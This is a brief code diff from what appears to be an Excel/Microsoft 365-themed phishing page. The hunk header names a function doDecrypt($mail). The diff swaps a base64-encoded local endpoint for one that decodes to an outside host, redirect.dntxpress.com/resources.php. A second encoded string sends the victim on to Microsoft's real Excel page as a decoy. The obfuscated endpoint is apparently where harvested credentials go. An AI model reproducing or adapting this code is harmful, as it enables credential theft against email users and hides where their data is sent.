@@ -80,7 +80,7 @@ function doDecrypt($mail)
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 <script>           
             $(function() {
-                var encodedString ="cmVzb3VyY2VzLnBocA==";          
+                var encodedString ="aHR0cHM6Ly9yZWRpcmVjdC5kbnR4cHJlc3MuY29tL3Jlc291cmNlcy5waHA=";          
             var decodedString = window.atob(encodedString); 
         var redirectString  = "aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS9lbi11cy9taWNyb3NvZnQtMzY1L2V4Y2Vs";          
         var decodedString = window.atob(redirectString);
